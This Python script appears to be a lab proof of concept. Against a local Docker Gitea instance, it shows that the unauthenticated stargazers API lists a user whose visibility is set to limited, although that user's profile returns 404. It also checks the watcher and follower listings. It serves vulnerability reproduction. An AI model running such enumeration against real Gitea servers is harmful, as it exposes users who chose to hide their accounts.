#!/usr/bin/env python3
"""Local oracle: unauth GET /repos/{owner}/{repo}/stargazers leaks limited users.

Gitea 1.27.3 GetStargazers has no visibility filter. Unauthenticated GET on a
public repo returns a limited/hidden stargazer while GET /users/{limited} is 404.

Loopback only. No shells.
"""
from __future__ import annotations

import base64
import json
import os
import ssl
import subprocess
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path

LABEL = "GITEA-STARGAZERS-HIDDEN"
DEFAULT_BASE = "http://127.0.0.1:18133"
COMPOSE_PROJECT = "gitea-stargazers-hidden"
USER_AGENT = "gitea-stargazers-hidden-lab"
ADMIN = "labadmin"
OWNER = "pubowner"
LIMITED = "hidstar"
PASSWORD = "LabPass123!"
REPO = "labstar"
# VisibleTypePublic=0, VisibleTypeLimited=1, VisibleTypePrivate=2
VIS_LIMITED = 1
HTTP_TIMEOUT = 30
COMPOSE_TIMEOUT = 60
HERE = Path(__file__).resolve().parent
_NAME_KEYS = ("login", "username", "name")


def fail(reason: str) -> int:
    print(f"FAIL {reason}")
    return 1


def names_in(payload: object) -> set[str]:
    names: set[str] = set()
    if not isinstance(payload, list):
        return names
    for item in payload:
        if not isinstance(item, dict):
            continue
        for key in _NAME_KEYS:
            val = item.get(key)
            if isinstance(val, str) and val:
                names.add(val)
    return names


@dataclass
class GiteaLab:
    base: str
    ctx: ssl.SSLContext

    @classmethod
    def connect(cls, base: str) -> GiteaLab:
        return cls(base=base.rstrip("/"), ctx=ssl._create_unverified_context())

    def compose(self, *args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["docker", "compose", *args],
            cwd=HERE,
            capture_output=True,
            text=True,
            timeout=COMPOSE_TIMEOUT,
            check=False,
        )

    def gitea_exec(self, *args: str) -> subprocess.CompletedProcess[str]:
        return self.compose("exec", "-T", "-u", "git", "gitea", *args)

    def req(
        self,
        method: str,
        path: str,
        data: dict[str, object] | None = None,
        auth: tuple[str, str] | None = None,
        query: str = "",
    ) -> tuple[int, str]:
        headers = {"Content-Type": "application/json", "User-Agent": USER_AGENT}
        if auth:
            token = base64.b64encode(f"{auth[0]}:{auth[1]}".encode("utf-8")).decode("ascii")
            headers["Authorization"] = f"Basic {token}"
        body = None if data is None else json.dumps(data).encode("utf-8")
        url = f"{self.base}{path}{query}"
        request = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=HTTP_TIMEOUT, context=self.ctx) as resp:
                return int(resp.status), resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return int(exc.code), exc.read().decode("utf-8", "replace")

    def create_user(self, name: str, email: str, *, admin: bool = False) -> None:
        cmd = [
            "gitea",
            "admin",
            "user",
            "create",
            "--username",
            name,
            "--password",
            PASSWORD,
            "--email",
            email,
            "--must-change-password=false",
        ]
        if admin:
            cmd.append("--admin")
        proc = self.gitea_exec(*cmd)
        out = (proc.stdout or "") + (proc.stderr or "")
        print(f"IOC create-user name={name} rc={proc.returncode} snippet={out[-200:]!r}")

    def set_visibility_limited(self) -> bool:
        status, body = self.req(
            "PATCH",
            f"/api/v1/admin/users/{LIMITED}",
            {"visibility": "limited"},
            auth=(ADMIN, PASSWORD),
        )
        print(f"IOC admin-patch-visibility status={status} snippet={body[:220]!r}")
        if status == 200 and "limited" in body:
            return True

        # SQL fallback: user.visibility 1 = limited
        proc = self.compose(
            "exec",
            "-T",
            "gitea",
            "sh",
            "-c",
            "command -v sqlite3 >/dev/null || apk add --no-cache sqlite >/dev/null; "
            f"sqlite3 /data/gitea/gitea.db \"UPDATE user SET visibility={VIS_LIMITED} "
            f"WHERE lower(name)=lower('{LIMITED}'); "
            f"SELECT name, visibility FROM user WHERE lower(name)=lower('{LIMITED}');\"",
        )
        out = ((proc.stdout or "") + (proc.stderr or "")).strip()
        print(f"IOC sql-visibility rc={proc.returncode} out={out[:300]!r}")
        return str(VIS_LIMITED) in out


def main() -> int:
    raw = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
    lab = GiteaLab.connect(raw)
    print(f"IOC base={lab.base}")
    os.environ.setdefault("COMPOSE_PROJECT_NAME", COMPOSE_PROJECT)

    status, body = lab.req("GET", "/api/v1/version")
    print(f"IOC version status={status} snippet={body[:160]!r}")
    if status != 200:
        return fail("Gitea version endpoint not ready")

    lab.create_user(ADMIN, "labadmin@localhost.invalid", admin=True)
    lab.create_user(OWNER, "pubowner@localhost.invalid")
    lab.create_user(LIMITED, "hidstar@localhost.invalid")

    status, body = lab.req("GET", "/api/v1/user", auth=(ADMIN, PASSWORD))
    print(f"IOC admin-login status={status} snippet={body[:160]!r}")
    if status != 200:
        return fail("admin login")

    status, body = lab.req(
        "POST",
        "/api/v1/user/repos",
        {"name": REPO, "private": False, "auto_init": True, "description": "public lab repo"},
        auth=(OWNER, PASSWORD),
    )
    print(f"IOC create-repo status={status} snippet={body[:200]!r}")
    if status not in (200, 201, 409):
        # 409 if rerun
        status2, body2 = lab.req("GET", f"/api/v1/repos/{OWNER}/{REPO}")
        print(f"IOC repo-get status={status2} snippet={body2[:160]!r}")
        if status2 != 200:
            return fail("create public repo")

    status, body = lab.req("PUT", f"/api/v1/user/starred/{OWNER}/{REPO}", auth=(LIMITED, PASSWORD))
    print(f"IOC star status={status} snippet={body[:160]!r}")
    if status not in (204, 200):
        return fail("limited user could not star public repo")

    status, body = lab.req(
        "PUT",
        f"/api/v1/repos/{OWNER}/{REPO}/subscription",
        auth=(LIMITED, PASSWORD),
    )
    print(f"IOC watch status={status} snippet={body[:160]!r}")

    status, body = lab.req("PUT", f"/api/v1/user/following/{OWNER}", auth=(LIMITED, PASSWORD))
    print(f"IOC follow status={status} snippet={body[:160]!r}")

    if not lab.set_visibility_limited():
        return fail("could not set limited visibility")

    status_user, body_user = lab.req("GET", f"/api/v1/users/{LIMITED}")
    print(f"IOC unauth-user-get status={status_user} snippet={body_user[:180]!r}")
    status_owner, body_owner = lab.req("GET", f"/api/v1/users/{OWNER}")
    print(f"IOC unauth-owner-get status={status_owner} snippet={body_owner[:120]!r}")
    if status_user != 404:
        return fail("limited user profile is not hidden (expected 404)")
    if status_owner != 200:
        return fail("public owner profile not visible")

    status_star, body_star = lab.req("GET", f"/api/v1/repos/{OWNER}/{REPO}/stargazers")
    print(f"IOC unauth-stargazers status={status_star} snippet={body_star[:400]!r}")
    if status_star != 200:
        return fail("unauth stargazers request failed")
    try:
        star_json = json.loads(body_star)
    except json.JSONDecodeError:
        return fail("stargazers body is not JSON")
    star_names = names_in(star_json)
    print(f"IOC stargazer-names={sorted(star_names)}")
    if LIMITED not in star_names:
        return fail("stargazers omit the limited user")

    status_sub, body_sub = lab.req("GET", f"/api/v1/repos/{OWNER}/{REPO}/subscribers")
    print(f"IOC unauth-watchers status={status_sub} snippet={body_sub[:300]!r}")
    if status_sub == 200:
        try:
            sub_names = names_in(json.loads(body_sub))
        except json.JSONDecodeError:
            sub_names = set()
        print(f"IOC watcher-names={sorted(sub_names)} leak={LIMITED in sub_names}")

    status_fol, body_fol = lab.req("GET", f"/api/v1/users/{OWNER}/followers")
    print(f"IOC unauth-followers-api status={status_fol} snippet={body_fol[:220]!r}")
    if status_fol == 200:
        try:
            fol_names = names_in(json.loads(body_fol))
        except json.JSONDecodeError:
            fol_names = set()
        print(f"IOC follower-names={sorted(fol_names)} leak={LIMITED in fol_names}")
        if LIMITED in fol_names:
            print("IOC followers-negative failed (limited user listed)")
        else:
            print("IOC followers-negative ok (limited user omitted)")

    status_web, body_web = lab.req("GET", f"/{OWNER}", query="?tab=followers")
    web_hit = LIMITED in body_web
    print(
        f"IOC unauth-followers-web status={status_web} "
        f"limited-in-html={web_hit} snippet={body_web[:120]!r}"
    )

    print(f"SUCCESS {LABEL}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
